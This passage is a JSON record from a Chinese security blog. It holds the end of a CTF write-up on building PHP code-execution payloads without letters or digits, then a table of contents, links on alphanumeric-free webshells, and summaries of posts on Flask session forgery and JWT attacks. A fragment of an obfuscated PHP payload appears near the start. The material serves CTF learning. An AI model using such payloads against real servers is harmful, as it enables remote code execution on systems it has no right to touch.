punctuation\">;</span>$$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token punctuation\">[</span><span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>$$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557891.png\" alt=\"在这里插入图片描述\"><br>成功获取flag</p>\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"https://blog.csdn.net/miuzzx/article/details/127830557\">https://blog.csdn.net/miuzzx/article/details/127830557</a><br><a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list\">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list</a><br><a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br><a href=\"https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah\">https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah</a></p>\n","feature":true,"text":"前言在CTFShow的每周挑战中遇到了PHP无数字字母构造的一系列题目，做了做发现我这个菜鸡不怎么会，所以对此类题进行一个简单总结，希望能对正在学习的师傅有所帮助。 构造语句的几种方式首先来看一下最原始的例题 &lt;?php highlight_file(__FILE__); ...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"12 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"CTF","slug":"CTF","count":4,"path":"api/tags/CTF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%9E%84%E9%80%A0%E8%AF%AD%E5%8F%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">构造语句的几种方式</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%BC%82%E6%88%96\"><span class=\"toc-text\">异或</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%87%AA%E5%A2%9E\"><span class=\"toc-text\">自增</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%96%E5%8F%8D\"><span class=\"toc-text\">取反</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%85%B3%E4%BA%8E%E8%87%AA%E5%A2%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9\"><span class=\"toc-text\">关于自增的一些知识点</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%9F%A5%E8%AF%86%E7%82%B91\"><span class=\"toc-text\">知识点1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%9F%A5%E8%AF%86%E7%82%B92\"><span class=\"toc-text\">知识点2</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CTF%E8%B5%9B%E9%A2%98%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">CTF赛题实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CTFshow%E5%90%83%E7%93%9C%E6%9D%AF-shellme-Revenge\"><span class=\"toc-text\">CTFshow吃瓜杯[shellme_Revenge]</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CTFShow-RCE%E6%8C%91%E6%88%982\"><span class=\"toc-text\">CTFShow[RCE挑战2]</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CTFShow-RCE%E6%8C%91%E6%88%983\"><span class=\"toc-text\">CTFShow[RCE挑战3]</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CTFShow-RCE%E6%8C%91%E6%88%984\"><span class=\"toc-text\">CTFShow[RCE挑战4]</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CTFShow-RCE%E6%8C%91%E6%88%985\"><span class=\"toc-text\">CTFShow[RCE挑战5]</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5\"><span class=\"toc-text\">参考链接</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"浅析Flask Session伪造","uid":"ac14ba8545a9348cf23ed9e993a44b8f","slug":"Flask Session伪造","date":"2023-01-05T14:55:20.000Z","updated":"2023-07-24T08:43:50.000Z","comments":true,"path":"api/articles/Flask Session伪造.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141552551.jpeg","text":"前言Flask的Session伪造之前并未有太多了解，在跨年夜的CatCTF中遇到了catcat这道题，因此对此类题目进行一个简单总结，lx56大师傅已经对Flask有很详细的介绍了，因此这里是站在巨人的肩膀上看世界了属于是，膜拜大佬。 Flask什么是Flask呢，他其实是一个...","link":"","photos":[],"count_time":{"symbolsCount":"8.4k","symbolsTime":"8 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"FLask","slug":"FLask","count":3,"path":"api/tags/FLask.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"浅析JWT Attack","uid":"a302f7d4a9c4a8ebcf973c7c3ec757d6","slug":"浅析JWT Attack","date":"2022-11-27T06:58:30.000Z","updated":"2023-03-14T07:25:14.000Z","comments":true,"path":"api/articles/浅析JWT Attack.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141525110.png","text":"声明文章首发于合天安全实验室https://mp.weixin.qq.com/s/WvVgavjJMXSZQsVFtHEOhA 前言在2022祥云杯时遇到有关JWT的题，当时没有思路，对JWT进行学习后来对此进行简单总结，希望能对正在学习JWT的师傅们有所帮助。 JWTJWT，即...","link":"","photos":[],"count_time":{"symbolsCount":"23k","symbolsTime":"21 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"JWT","slug":"JWT","count":1,"path":"api/tags/JWT.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}